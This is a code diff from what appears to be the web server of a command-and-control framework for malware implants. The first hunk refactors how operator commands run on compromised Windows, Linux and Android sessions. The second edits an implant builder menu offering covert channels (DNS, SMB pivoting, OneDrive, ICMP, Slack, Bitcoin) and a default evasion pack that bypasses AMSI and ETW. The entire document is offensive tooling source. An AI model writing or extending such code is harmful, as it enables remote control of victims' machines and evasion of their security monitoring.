@@ -231,30 +231,9 @@ func handleSessionExecute(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var execReq *sudosocpb.ExecuteReq
-
-	// Android implants run in a restricted process without PATH. Wrap every
-	// command in /system/bin/sh -c so binaries are found via the shell.
-	if strings.Contains(strings.ToLower(session.OS), "android") {
-		execReq = &sudosocpb.ExecuteReq{
-			Path:   "/system/bin/sh",
-			Args:   []string{"-c", req.Command},
-			Output: true,
-			Request: &commonpb.Request{SessionID: sessionID},
-		}
-	} else {
-		args := strings.Fields(req.Command)
-		if len(args) == 0 {
-			jsonError(w, "empty command", http.StatusBadRequest)
-			return
-		}
-		execReq = &sudosocpb.ExecuteReq{
-			Path:   args[0],
-			Args:   args[1:],
-			Output: true,
-			Request: &commonpb.Request{SessionID: sessionID},
-		}
-	}
+	// Wrap in platform shell — Windows/Android/Linux each need different paths.
+	// shellWrapExecReq is defined in ws_terminal.go (same package).
+	execReq := shellWrapExecReq(session.OS, req.Command, sessionID)
 
 	resp := &sudosocpb.Execute{Response: &commonpb.Response{}}
 	if err := webRPC.GenericHandler(execReq, resp); err != nil {
@@ -403,11 +382,11 @@ func buildGenerateOptions(os, arch string) generateOptions {
 				{Value: "http",       Label: "HTTP",         Description: "Plain HTTP"},
 				{Value: "dns",        Label: "DNS/DoH",      Description: "Survives all firewalls"},
 				{Value: "wg",         Label: "WireGuard",    Description: "Modern VPN tunnel"},
-				{Value: "smb",        Label: "SMB",          Description: "Named-pipe — no internet required"},
-				{Value: "graph",      Label: "MS Graph",     Description: "OneDrive/O365 C2 — extreme stealth"},
-				{Value: "icmp",       Label: "ICMP",         Description: "Ping covert channel"},
-				{Value: "slack",      Label: "Slack/Teams",  Description: "Collaboration platform C2"},
-				{Value: "blockchain", Label: "Blockchain",   Description: "Bitcoin OP_RETURN — uncensorable"},
+				{Value: "smb",        Label: "SMB",          Description: "Named-pipe — no internet, pivot via existing session"},
+				{Value: "graph",      Label: "MS Graph",     Description: "OneDrive/O365 C2 — extreme stealth [needs config]"},
+				{Value: "icmp",       Label: "ICMP",         Description: "Ping covert channel [needs root on server]"},
+				{Value: "slack",      Label: "Slack/Teams",  Description: "Collaboration platform C2 [needs API token]"},
+				{Value: "blockchain", Label: "Blockchain",   Description: "Bitcoin OP_RETURN — uncensorable [experimental]"},
 			},
 			Evasion: []evasionOption{
 				{Key: "evasion",     Label: "Evasion Pack",    Description: "AMSI bypass, ETW bypass, sleep obfuscation", Default: true},
